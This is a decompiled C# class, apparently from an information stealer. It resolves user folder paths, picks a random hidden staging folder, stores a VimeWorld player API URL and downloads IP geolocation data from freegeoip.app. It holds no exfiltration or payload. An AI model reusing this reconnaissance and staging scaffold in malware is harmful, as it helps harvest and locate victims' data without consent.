using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Xml;

internal class Class38
{
	public static readonly string string_0 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

	public static readonly string string_1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

	public static readonly string string_2 = Environment.GetFolderPath(Environment.SpecialFolder.System);

	public static readonly string string_3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	public static readonly string string_4 = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);

	public static readonly string string_5 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	public static readonly string string_6 = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

	public static readonly string string_7 = Assembly.GetExecutingAssembly().Location;

	public static readonly string string_8 = Path.GetDirectoryName(string_7);

	public static string[] string_9 = new string[3] { string_3, string_1, string_4 };

	public static string string_10 = string_9[new Random().Next(0, string_9.Length)];

	public static string string_11 = string_10 + "\\44";

	public static string string_12 = DateTime.Now.ToString("MM/dd/yyyy h:mm");

	public static string string_13 = DateTime.Now.ToString("MM/dd/yyyy");

	public static string string_14 = "https://api.vimeworld.ru/user/name/";

	public static string string_15 = "https://freegeoip.app/xml/";

	public static XmlDocument xmlDocument_0 = new XmlDocument();

	public static bool bool_0 = true;

	public static void smethod_0()
	{
		try
		{
			xmlDocument_0.LoadXml(new WebClient().DownloadString(string_15));
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex?.ToString() + "Ethernet()");
			bool_0 = false;
		}
	}
}
